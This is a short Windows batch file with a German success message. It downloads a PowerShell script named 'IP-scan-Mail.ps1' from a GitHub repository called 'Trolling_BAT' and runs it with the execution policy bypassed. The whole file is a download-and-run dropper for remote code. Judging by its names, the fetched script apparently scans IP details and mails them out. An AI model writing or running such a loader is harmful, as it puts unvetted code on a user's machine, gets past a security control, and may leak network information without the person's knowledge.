@echo off
set "URL=https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/IP-scan-Mail.ps1"
set "Destination=C:\Temp\IP-scan-Mail.ps1"

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%Destination%'"

powershell -ExecutionPolicy Bypass -File "%Destination%"

echo PowerShell-Skript wurde erfolgreich heruntergeladen und ausgefuehrt!
exit
